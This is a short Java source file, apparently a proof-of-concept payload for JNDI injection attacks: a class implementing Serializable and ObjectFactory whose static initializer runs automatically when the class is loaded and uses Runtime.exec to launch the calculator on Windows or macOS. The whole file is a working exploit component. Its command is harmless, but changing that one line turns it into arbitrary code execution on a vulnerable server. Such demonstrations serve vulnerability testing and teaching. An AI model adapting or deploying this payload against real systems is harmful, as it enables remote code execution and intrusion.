import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.Serializable;
import java.util.Hashtable;

public class Payload implements Serializable, ObjectFactory
{
	//##########################
	//# Triggers
	//##########################
	
    static {
        System.out.println("Calculator payload received by static HACKING");
		openClaculator();
    }

    public Payload() {
        System.out.println("Calculator payload received by constructor");
    }

    @Override public String toString() {
        return "Exploit payload";
    }

    
	//##########################
	//# Must include
	//##########################
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception
    {
        return this;
    }
	
	
	//##########################
	//# General Methods
	//##########################
	private static void openClaculator() {
        try {
            String[] var0 = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", "calc.exe"} : new String[]{"open", "/System/Applications/Calculator.app"};
            Runtime.getRuntime().exec(var0).waitFor();
        } catch (Exception var1) {
            var1.printStackTrace();
        }
    }
}


















